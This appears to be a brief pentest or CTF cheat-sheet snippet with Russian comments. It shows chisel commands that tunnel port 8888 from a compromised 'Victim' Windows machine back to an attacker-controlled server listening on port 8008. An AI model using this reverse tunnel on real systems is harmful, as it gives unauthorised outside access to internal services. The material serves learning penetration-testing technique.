C:\Users\Victim\Desktop>chisel client 10.10.14.38:8008 R:8888:127.0.0.1:8888   
#проброс 8888 на порт сервера 8008  
  
attaker@attacker:/home/attacker# ./chisel server --p 8008 --reverse -v   
#сервер слушает на 8008 порту проброшенный ранее 8888